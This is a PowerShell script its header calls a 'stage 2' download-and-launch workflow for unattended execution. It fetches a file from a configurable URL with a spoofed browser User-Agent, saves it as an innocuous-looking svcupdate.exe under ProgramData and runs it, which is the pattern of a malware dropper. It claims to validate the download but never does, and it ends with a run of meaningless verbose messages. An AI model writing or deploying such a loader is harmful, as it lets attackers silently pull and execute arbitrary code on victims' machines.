<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.
#>
[CmdletBinding()]
param(
    [string]$TargetUrl = 'http://example.org/assets/update.dat',
    [string]$DownloadPath = "C:\ProgramData\svcupdate.exe",
    [string]$ActivityLog = "$env:TEMP\telemetry.json",
    [string]$BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    [int]$StageTimeout = 91,
    [int]$RetryAttempts = 5,
    [int]$BackoffSeconds = 17
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $ActivityLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$RetryCount = 5,
        [int]$RetryDelay = 17,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $TargetUrl
    $OperationResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $DownloadPath -RetryCount $RetryAttempts -RetryDelay $BackoffSeconds -UserAgent $BrowserAgent
    if ($OperationResult) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath $DownloadPath
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $TargetUrl
    Destination = $DownloadPath
    RetryCount = $RetryAttempts
    TimeoutSec = $StageTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Reading configuration values"
Write-Verbose "Preparing working directory"
Write-Verbose "Checking local path"
Write-Verbose "Retry budget remaining"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Exporting operation report"
Write-Verbose "Starting workflow"
Write-Verbose "Validating result"
Write-Verbose "Applying operation timeout"
Write-Verbose "Stage handoff finished"
Write-Verbose "Collecting host metadata"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Set-Location -Path $env:TEMP
